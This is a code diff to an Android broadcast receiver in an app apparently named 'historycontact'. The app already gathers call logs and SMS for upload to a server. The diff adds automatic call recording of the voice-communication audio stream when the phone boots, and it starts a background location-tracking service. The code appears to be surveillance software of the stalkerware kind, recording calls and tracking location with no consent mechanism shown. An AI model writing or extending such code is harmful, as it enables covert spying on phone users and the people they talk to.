@@ -6,6 +6,8 @@ import an.xuan.tong.historycontact.api.Repository
 import an.xuan.tong.historycontact.api.model.CallLogServer
 import an.xuan.tong.historycontact.api.model.PowerAndInternet
 import an.xuan.tong.historycontact.api.model.SmsSendServer
+import an.xuan.tong.historycontact.call.CallRecord
+import an.xuan.tong.historycontact.location.LocationService
 import an.xuan.tong.historycontact.realm.InternetHistoryCaching
 import android.content.BroadcastReceiver
 import android.content.Context
@@ -15,7 +17,9 @@ import android.util.Log
 
 import an.xuan.tong.historycontact.realm.RealmUtils
 import an.xuan.tong.historycontact.smsradar.SmsRadarService
+import android.media.MediaRecorder
 import android.net.ConnectivityManager
+import android.os.Environment
 import com.facebook.accountkit.Account
 import com.facebook.accountkit.AccountKit
 import com.facebook.accountkit.AccountKitCallback
@@ -26,13 +30,13 @@ import okhttp3.MediaType
 import okhttp3.MultipartBody
 import okhttp3.RequestBody
 import java.io.File
+import java.text.SimpleDateFormat
 import java.util.*
 
 
 class SMSreceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
-        if (isOnline(context)) {
-
+       /* if (isOnline(context)) {
             //handler call
             val listCallLogFail = RealmUtils.getAllCallLog()
             listCallLogFail?.forEachIndexed { index, it ->
@@ -66,7 +70,7 @@ class SMSreceiver : BroadcastReceiver() {
             }
         } else {
             RealmUtils.saveInternetOnOff(false)
-        }
+        }*/
 
         if ("android.intent.action.BOOT_COMPLETED" == intent.action) {
             Log.e("antx", "onReceive sms BOOT_COMPLETED")
@@ -78,6 +82,27 @@ class SMSreceiver : BroadcastReceiver() {
             } else {
                 context.startService(intentSms)
             }
+            //Call
+            var callRecord = CallRecord.Builder(context)
+                    .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
+                    .setRecordDirName("Historycontact")
+                    .setRecordDirPath(Environment.getExternalStorageDirectory().path)
+                    .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                    .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
+                    .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                    .setShowSeed(true)
+                    .build()
+
+            callRecord.startCallRecordService()
+
+        }
+        //Location
+        val intent = Intent()
+        intent.setClass(context, LocationService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent)
+        } else {
+            context.startService(intent)
         }
         if ("android.intent.action.QUICKBOOT_POWEROFF" == intent.action) {
             Log.e("antx", "onReceive sms BOOT_COMPLETED")
